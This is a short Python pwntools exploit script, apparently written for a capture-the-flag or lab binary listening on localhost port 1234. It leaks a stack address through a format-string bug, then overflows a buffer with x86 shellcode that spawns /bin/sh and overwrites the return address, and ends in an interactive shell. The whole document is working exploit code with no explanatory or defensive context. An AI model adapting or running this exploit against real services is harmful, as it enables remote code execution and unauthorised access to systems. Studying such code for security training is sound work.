from pwn import *

shellcode = (
        "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x6a\x1c\x58"
        "\x83\xE8\x11"
        "\x99\xcd\x80"
        )

format_str = "%6$x\n"

con = remote('localhost', 1234)

#getting leaked addr
con.recvuntil("\n");
con.send(format_str);
data = con.recvuntil("\n")
con.recvuntil(": ")

#getting address of the buffer
leak = data.split(", ")[1]
print "leaked addr: 0x" + leak
ret_addr = int(leak,16) - 0x9a

#creating payload
payload = shellcode
payload += "f"*(62-len(shellcode))
payload += p32(ret_addr)
payload += "\n"


print "sending payload..."
con.send(payload)

con.interactive()